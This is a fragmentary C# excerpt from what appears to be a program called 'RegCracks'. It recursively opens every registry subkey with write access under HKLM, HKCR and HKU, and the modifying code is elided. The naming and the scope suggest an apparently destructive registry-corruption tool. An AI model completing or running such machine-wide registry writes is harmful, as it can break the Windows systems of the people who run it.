...
namespace RegCracks
{
    public partial class Form2 : Form
    {
        ...
        public void frickReg(RegistryKey key, double dm)
        {
            foreach(var k in key.GetSubKeyNames())
            {
                try
                {
                    frickReg(key.OpenSubKey(k, true), dm);
                } catch (Exception) { }
            }
        ...
        public void frick()
        {
            ...
            frickReg(Registry.LocalMachine, Form4.hklm);
            frickReg(Registry.ClassesRoot, Form4.hkcr);
            frickReg(Registry.Users, Form4.hku);
